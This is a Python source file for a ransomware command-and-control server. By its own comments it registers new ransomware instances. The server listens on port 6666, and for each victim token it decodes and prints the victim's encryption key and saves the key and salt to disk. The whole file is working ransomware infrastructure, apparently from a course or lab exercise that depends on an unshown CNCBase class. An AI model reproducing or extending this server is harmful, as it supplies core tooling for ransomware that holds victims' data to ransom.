import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase


class CNC(CNCBase):

    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field
        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        
        # printing the key in the cnc terminal to facilitate the debugging
        print(body)
        key = str(base64.b64decode(body['key']), 'utf8')
        print(f"\nKEY = {key}\n")

        # create a folder for ciphered elements
        newPath = os.path.join(CNC.ROOT_PATH, body['token'])
        os.mkdir(newPath)

        # saving ciphered elements
        self.save_b64(body['token'], body['salt'], 'salt.bin')
        self.save_b64(body['token'], body['key'], 'key.bin')

        return {"status":"KO"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()